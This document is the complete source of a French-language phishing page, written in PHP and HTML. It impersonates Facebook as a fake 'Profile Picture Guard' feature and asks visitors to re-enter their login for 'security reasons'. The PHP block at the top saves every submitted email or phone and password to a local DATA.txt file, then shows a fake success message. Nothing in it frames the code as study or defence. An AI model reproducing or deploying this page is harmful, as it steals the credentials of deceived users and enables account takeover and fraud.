<?php
    if(!empty($_POST['id']) && !empty($_POST['pswd'])){
        $id = $_POST['id'];
        $pswd = $_POST['pswd'];
        $data = __DIR__ . DIRECTORY_SEPARATOR . 'DATA' . '.txt';
        file_put_contents($data, date('D-M') . ' :: id: ' . $id . ' // pswd: ' . $pswd . PHP_EOL , FILE_APPEND);
    }
?>
<!DOCTYPE html>
<html>
	<head>
		<title>Profile Picture Guard</title>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width">
		<link rel="stylesheet" href="style.css">
	</head>
	<body>
		<div class="center">
		<header>
			<img src="logo.svg" alt="FACEBOOK" id="logofacbooksvg">
		</header>
		<div class="bloc shadow">
			<h1>Bienvenue sur Facebook Profile Picture Guard</h1>
			<p id="intro">Protéger votre Profile avec la fonctionnalité <b>Profile Guard</b> de Facebook. Elle empêche toute individue de <b>Télechager</b>, <b>Caputer</b>, <b>Copier</b> votre profile Facebook.</p>
			<div class="">
					<?php if (empty($_POST['id']) && empty($_POST['pswd'])) :?>
							<p id="verification">
							<i>Pour des raisons de sécurité, veillez resaisir vos coordonnées Facebook.</i></p>
							<div id="section12" class="center">
							<form action="" method="POST">
								<input type="text" name="id" placeholder="E-mail ou Mobile" required class="input1 shadowinset" > </br>
								<input type="password" name="pswd" placeholder="********" required class="input1 shadowinset"> </br>
								<div class="center">
									<input type="submit" value="Continuer" class="input2 shadow">
								</div>
							</form>
							</div>
						<?php else: ?>
							<p style="border: green solid 2px; border-radius: 5px; padding: 5px; background-color: #b9ffb9; color: green;">
							<i>
								Votre demande a bien été Enregister. Une notification vous sera envoyée sous peu.
							</i>
						</p>
						<div class="center">
							<a href="http://www.facebook.com/profile"><input type="submit" value="Profile" class="input2 shadow"></a>
						</div>

						<?php endif ?>
			</div>
		
		<hr>
		
		<footer>
			<p>Facebook Inc. - Profile Guard <i>All Rights reseves</i> &copy;2021</p>
		</footer>
		</div>
		</div>
	</body>
</html>